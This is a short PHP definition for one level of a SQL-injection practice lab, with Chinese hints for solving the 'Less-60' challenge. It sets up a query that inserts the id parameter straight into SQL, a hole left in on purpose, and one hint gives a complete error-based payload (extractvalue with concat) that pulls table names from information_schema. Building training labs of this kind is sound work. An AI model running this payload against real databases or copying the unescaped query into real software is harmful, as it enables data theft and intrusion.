<?php
// Less-60 内部演练接口（挑战关）
if (!defined('SQLI_MALL')) { die('forbidden'); }
require_once __DIR__ . '/_series.php';
return series_def([
  'times' => 10, 'difficulty' => 4, 'error' => true,
  'sql' => 'SELECT id, title, content FROM oa_notice WHERE id=("{id}") LIMIT 0,1',
  'hints' => array (
  0 => '报错回显可用，闭合方式先探测——双引号加括号。',
  1 => 'payload 先补 ") 再接报错函数。',
  2 => '示例：?id=1") and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\'challenges\'),0x7e))-- -',
),
]);
